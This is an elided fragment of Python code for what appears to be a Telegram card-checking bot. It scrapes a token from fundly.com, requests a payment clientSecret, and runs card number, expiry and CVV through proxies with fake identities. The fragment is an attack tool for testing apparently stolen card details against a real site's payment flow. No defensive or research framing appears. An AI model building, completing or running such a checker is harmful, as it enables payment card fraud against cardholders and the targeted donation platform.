    ...
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
        async with session.get("https://fundly.com/", headers=headers) as response:
            ...
            if 'authenticity_token' in response_text:
                ...
                print(token)
                return await req2(chat_id, cc, mes, ano, cvv, token, start_time, session, fake, email, proxy_url, proxy_auth)

async def req2(chat_id, cc, mes, ano, cvv, token, start_time, session, fake, email, proxy_url, proxy_auth):
    ...
    async with session.post(url, json=data, headers=headers,) as response:
        ...
        if 'application/json' in content_type:
            ...
            if 'clientSecret' in response_data:
                ...
                print(pi)
                return await req3(chat_id, cc, mes, ano, cvv, clientsecret, start_time, session, fake, pi, email ,proxy_url ,proxy_auth, acc, id)
            else:
                print("clientSecret not found in response")
...
async def req3(chat_id, cc, mes, ano, cvv, clientsecret, start_time, session, fake, pi, email ,proxy_url ,proxy_auth, acc, id):
    headers = {
    ...
    response_message = (
        ...
        f"𝐏𝐫𝐨𝐱𝐲 ⇾ <code>{proxy_encrypted}</code> {proxy_status}\n\n"
